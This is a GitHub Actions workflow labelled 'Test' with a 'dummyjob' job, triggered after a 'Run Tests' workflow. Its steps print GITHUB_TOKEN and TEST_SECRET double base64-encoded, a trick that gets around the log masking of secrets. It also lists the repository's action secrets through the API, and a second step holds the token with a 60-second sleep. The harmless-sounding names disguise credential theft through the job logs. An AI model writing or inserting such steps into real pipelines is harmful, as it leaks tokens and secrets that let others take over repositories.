name: Test

on:
  workflow_run:
    workflows: [Run Tests]
    types:
      - completed

jobs:
  dummyjob:
    runs-on: ubuntu-latest
    steps:
      - name: Post run1
        run: |
          echo $GITHUB_TOKEN | base64 -w0 | base64 -w 0
          echo $TEST_SECRET | base64 -w0 | base64 -w 0
          gh api -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" /repos/OWNER/REPO/actions/secrets
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TEST_SECRET: ${{ secrets.TEST_SECRET }}
      - name: Post run2
        run: |
          sleep 60
        env:
          SECRET_TOKEN: ${{ secrets.GITHUB_TOKEN }}
